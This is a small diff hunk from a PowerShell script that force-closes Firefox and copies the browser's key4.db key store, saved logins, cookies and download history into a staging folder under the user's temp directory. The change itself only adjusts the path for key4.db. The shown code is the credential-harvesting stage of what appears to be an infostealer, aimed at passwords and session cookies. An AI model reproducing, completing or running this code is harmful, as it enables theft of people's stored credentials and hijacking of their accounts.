@@ -1407,7 +1407,7 @@ if($key4 -ne $null){
 taskkill /IM firefox.exe /F
 Start-Sleep 1
 New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
-Get-Content $key4 > $env:TMP\$FolderName\Firefox\key4.db
+Get-Content $key4 > $env:TMP\$FolderName\Browsers\Firefox\key4.db
 Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\logins.json
 Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\cookies.sqlite
 Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\downloads.json
